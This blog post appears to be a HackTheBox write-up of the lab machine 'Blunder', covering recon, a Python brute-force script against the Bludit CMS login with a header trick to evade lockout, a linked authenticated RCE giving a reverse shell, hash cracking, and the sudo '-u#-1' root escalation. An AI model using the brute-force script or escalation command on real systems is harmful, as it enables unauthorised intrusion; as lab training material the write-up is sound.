---
layout: post
title: "HackTheBox - Blunder"
date: 2020-10-17
author: Grillette

categories:
    - "HTB-Boxes"
---
**Blunder** was an easy Linux box on [HackTheBox](https://www.hackthebox.eu).
This box was about :
- Enumeration on a website to find that the Bludit CMS is used
- Fuzzing the website to find a TODO list indicating the CMS is not up to date
- Generating a list of password and brute force the authentication in order to find some valid credentials
- Performing a RCE on the server as an authenticated user to have a reverse shell
- Enumeration on the server to find a user hashed password and retrieve the cleartext to log in as**hugo**
- Exploitation of a missconfiguration of the sudo right to get a root shell.

![Box Logo]({{ "assets/Blunder/blunder.png" | absolute_url }} "Box Logo")

<!--excerpt-->

# Initial Foothold
## Reckon

Here we go for the initial reckon, let's run [`nmap`](https://nmap.org/) to see what we got.

![Nmap]({{ "assets/Blunder/nmap.png" | absolute_url }} "Nmap result")

We can see a classic *web server* exposed on port 80.
There is also a *ftp* server showing on port 21 but it is closed so we can't access it.

### HTTP
The website looks like this :

![Website]({{ "assets/Blunder/initialWebsite.png" | absolute_url }} "initial Website")

There are different articles.

With a bit of fuzzing, we discover a `/admin` directory :

![First directory fuzzing]({{ "assets/Blunder/wfuzz1.png" | absolute_url }} "First directory fuzzing")

And by visiting the url `http://10.10.10.191/admin` we have the following :

![Admin page]({{ "assets/Blunder/adminPage.png" | absolute_url }} "Admin page")

By looking on the Internet, we discover the [**Bludit CMS**](https://www.bludit.com/).

And with some more research, we discover an authenticated Remote Code Execution on this CMS [here](https://github.com/cybervaca/CVE-2019-16113)

## Exploiting

### HTTP

We try to do some more enumeration on the website like following :

![wfuzz Todo]({{ "assets/Blunder/wfuzzTodo.png" | absolute_url }} "wfuzz Todo")

The `http://10.10.10.191/todo.txt` could be interesting :

![Todo list]({{ "assets/Blunder/todo.png" | absolute_url }} "Todo list")

We have the information that the CMS is not up to date, so it is probably vulnerable to the previously discovered vulnerability.
We also have the information that there is a user named `fergus`. We can try to brute force the login page to find the password for this user.

We can use a tool to generate a list of password based on the content on the website. By generating a list, we have more chance to find a correct password than with a random dictionary. We'll use the [CeWL](https://github.com/digininja/CeWL) tool.

With the following command line, we can generate a list of password :
```
./cewl.rb -w ~/HackTheBox/Blunder/password.txt  http://10.10.10.191/
CeWL 5.5.0 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

We use python to write a little script to brute force the authentication form :

```python
import requests


def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]


def main():
    url = 'http://10.10.10.191/admin/login'
    username = 'fergus'

    passwordFile = "password.txt"

    passwords = open_ressources(passwordFile)

    for password in passwords:

        print("[+] Retrieving CSRF token")

        session = requests.Session()

        r = session.get(url)
        retour = r.text

        findingToken = 'tokenCSRF" value="'
        indexStart = retour.find(findingToken)

        indexEnd = retour.find('">',indexStart)

        csrfToken = retour[int(indexStart+len(findingToken)):int(indexEnd)]

        if csrfToken != '':
            print("Success ! \n[+] CsrfToken : %s" % csrfToken)
        else :
            print("Error on csrfToken !")
            exit(1)


        payload = {
            'tokenCSRF':csrfToken,
            'username':username,
            'password':password,
            'save':''
        }

        header = {
            'X-Forwarded-For':password,
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
            'Referer':url
        }

        login = session.post(url, headers=header, data=payload, allow_redirects=False)
        print("Trying %s" % password)

        if 'location' in login.headers:
            print(login.headers['location'])
            if login.headers['location'].find('dashboard') != -1 :
                exit(0)

if __name__ == '__main__':
    main()
```

With this script, we obtain the following credentials
```
username : fergus
password : RolandDeschain
```

We can now connect to the admin panel :

![Admin panel]({{ "assets/Blunder/adminPanel.png" | absolute_url }} "Admin panel")

We can now exploit the previously found [RCE exploit](https://github.com/cybervaca/CVE-2019-16113﻿) like the following :

![Bludit Pwn]({{ "assets/Blunder/bluditPwn.png" | absolute_url }} "Bludit Pwn")

And with a *netcat* listening on our host :

![Netcat listening]({{ "assets/Blunder/netcat.png" | absolute_url }} "Netcat listening")

So we have a first shell as the **www-data** user.

# User access

In the `www/` directory, we notice another interesting folder :
```bash
www-data@blunder:/var/www$ ls
bludit-3.10.0a
bludit-3.9.2
html
```

By digging in the tree directory we finally found the /var/www/bludit-3.10.0a/bl-content/databases file which can be pretty interesting

```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
categories.php
pages.php
plugins
security.php
site.php
syslog.php
tags.php
users.php
```

Let's try to grab some user info !

![User database information]({{ "assets/Blunder/databaseUserInfo.png" | absolute_url }} "User database information")

We have a `faca404fd5c0a31cf1897b823c695c85cffeb98d` password which is hashed with ShA1.

We can use [crackstation](https://crackstation.net/) or john for example to crack this hash and retrieve the plaintext password.
We finally end up with this password in cleartext : **Password120**

We can now elevate our privilege as the user `hugo` and grab the first flag :

![First user]({{ "assets/Blunder/firstUser.png" | absolute_url }} "First user")

# Privilege Escalation

The privilege escalation is pretty straight forward.

With a basic enumeration check we can spot something fishy :

![sudo configuration]({{ "assets/Blunder/sudoConfig.png" | absolute_url }} "sudo configuration")

This shows that the **hugo** user cannot run /bin/bash as root.

Reading info in [this link](https://www.exploit-db.com/exploits/47502), we understand that there is a flaw in this configuration.
With ALL specified, we can run /bin/bash as any user.
Sudo does not check for the existence of the specified user id and executes the command with arbitrary user id with the sudo privileges.
`-u#-1` returns as 0 which is root's account id.

So with the following command, we can elevate our privilege as root account :
```
hugo@blunder:/$ sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```

And here we are, finally root on this great machine !
